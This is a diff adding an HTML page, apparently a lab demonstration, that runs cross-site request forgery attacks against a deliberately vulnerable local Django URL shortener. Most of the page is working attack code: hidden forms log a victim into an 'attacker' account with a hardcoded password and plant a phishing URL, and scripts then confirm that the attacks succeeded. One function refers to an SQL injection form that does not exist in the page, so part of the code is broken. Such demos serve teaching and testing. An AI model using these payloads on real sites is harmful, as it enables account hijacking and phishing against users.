@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF Attack Demonstration</title>
+    <style>
+        body { 
+            font-family: Arial, sans-serif; 
+            max-width: 800px; 
+            margin: 50px auto; 
+            padding: 20px; 
+        }
+        .form-container {
+            background: #f5f5f5; 
+            padding: 20px; 
+            border-radius: 5px;
+            margin-bottom: 20px;
+        }
+        button {
+            background: #ff5722; 
+            color: white; 
+            padding: 10px 20px; 
+            border: none; 
+            border-radius: 4px; 
+            cursor: pointer;
+        }
+        button:hover { background: #d84315; }
+        .status { 
+            margin: 10px 0; 
+            padding: 10px; 
+            border-radius: 4px; 
+            font-weight: bold; 
+        }
+        .success { 
+            background: #d4edda; 
+            color: #155724; 
+            border: 1px solid #c3e6cb; 
+        }
+        .warning { 
+            background: #fff3cd; 
+            color: #856404; 
+            border: 1px solid #ffeaa7; 
+        }
+        .error { 
+            background: #f8d7da; 
+            color: #721c24; 
+            border: 1px solid #f5c6cb; 
+        }
+    </style>
+</head>
+<body>
+    
+    <h1>CSRF Attack Demo</h1>
+    <p>This page demonstrates CSRF attacks against the vulnerable URL shortener.</p>
+    
+    <div class="form-container">
+        <h3>Attack #1: Login CSRF (Session Fixation)</h3>
+        <p>Logs victim into attacker's account:</p>
+        
+        <form id="loginCsrfForm" action="http://127.0.0.1:8000/login/" method="post" target="hiddenFrame1">
+            <input type="hidden" name="username" value="attacker">
+            <input type="hidden" name="password" value="k(%$mt4NskB2RX2g">
+        </form>
+        
+        <iframe name="hiddenFrame1" style="display:none;"></iframe>
+        <button onclick="submitLoginAttack()">Execute Login Attack</button>
+        <div id="loginStatus" class="status" style="display: none;"></div>
+    </div>
+    
+    <div class="form-container">
+        <h3>Attack #2: URL Creation CSRF</h3>
+        <p>Creates malicious URL in victim's account:</p>
+        
+        <form id="urlCsrfForm" action="http://127.0.0.1:8000/shorten/" method="post" target="hiddenFrame2">
+            <input type="hidden" name="url" value="http://malicious-phishing-site.com/steal-credentials">
+            <input type="hidden" name="notes" value="Malicious URL created via CSRF attack">
+        </form>
+        
+        <iframe name="hiddenFrame2" style="display:none;"></iframe>
+        <button onclick="submitUrlAttack()">Execute URL Attack</button>
+        <div id="urlStatus" class="status" style="display: none;"></div>
+    </div>
+        
+        <h3>Why This Works:</h3>
+        <ul>
+            <li>Login and URL creation endpoints have <code>@csrf_exempt</code></li>
+            <li>Search endpoint uses raw SQL queries vulnerable to injection</li>
+            <li>No CSRF token validation or SQL parameterization</li>
+            <li>The browser automatically includes session cookies in cross-origin requests</li>
+            <li>The server trusts any request that comes with valid authentication</li>
+        </ul>
+        
+        <h3>How to Test:</h3>
+        <ol>
+            <li>First, create the attacker account: Go to <a href="http://127.0.0.1:8000/admin/" target="_blank">Django Admin</a> and create user "attacker" with password "k(%$mt4NskB2RX2g"</li>
+            <li>Open <a href="http://127.0.0.1:8000" target="_blank">the vulnerable URL shortener</a> in another tab</li>
+            <li>Come back to this page and click the attack buttons</li>
+            <li>Check if the login worked and if malicious URLs were created</li>
+        </ol>
+    <script>
+        function submitLoginAttack() {
+            console.log('Executing login CSRF attack...');
+            document.getElementById('loginCsrfForm').submit();
+            
+            const status = document.getElementById('loginStatus');
+            status.style.display = 'block';
+            status.className = 'status warning';
+            status.innerHTML = 'Attack submitted! Check main app tab for login as "attacker"';
+            
+            setTimeout(checkLoginStatus, 1000);
+        }
+        
+        function submitUrlAttack() {
+            console.log('Executing URL creation CSRF attack...');
+            document.getElementById('urlCsrfForm').submit();
+            
+            const status = document.getElementById('urlStatus');
+            status.style.display = 'block';
+            status.className = 'status success';
+            status.innerHTML = 'Malicious URL created! Check <a href="http://127.0.0.1:8000/my-urls/" target="_blank">My URLs</a>';
+        }
+        
+        function submitSqlInjectionAttack() {
+            console.log('Executing SQL injection attack...');
+            document.getElementById('sqlInjectionForm').submit();
+            
+            const status = document.getElementById('sqlStatus');
+            status.style.display = 'block';
+            status.className = 'status success';
+            status.innerHTML = 'SQL injection executed! Search for "HACK" on main site';
+        }
+        
+        function checkLoginStatus() {
+            fetch('http://127.0.0.1:8000/', {
+                method: 'GET',
+                credentials: 'include'
+            })
+            .then(response => response.text())
+            .then(html => {
+                const status = document.getElementById('loginStatus');
+                if (html.includes('Welcome, attacker') || html.includes('attacker')) {
+                    status.className = 'status success';
+                    status.innerHTML = 'SUCCESS: Logged in as "attacker"!';
+                } else {
+                    status.className = 'status error';
+                    status.innerHTML = 'Not logged in as attacker';
+                }
+                status.style.display = 'block';
+            })
+            .catch(error => {
+                console.log('Status check failed:', error);
+            });
+        }
+        
+        // Auto-check login status
+        window.onload = function() {
+            setTimeout(checkLoginStatus, 1000);
+            setInterval(checkLoginStatus, 5000);
+        };
+    </script>
+</body>
+</html>
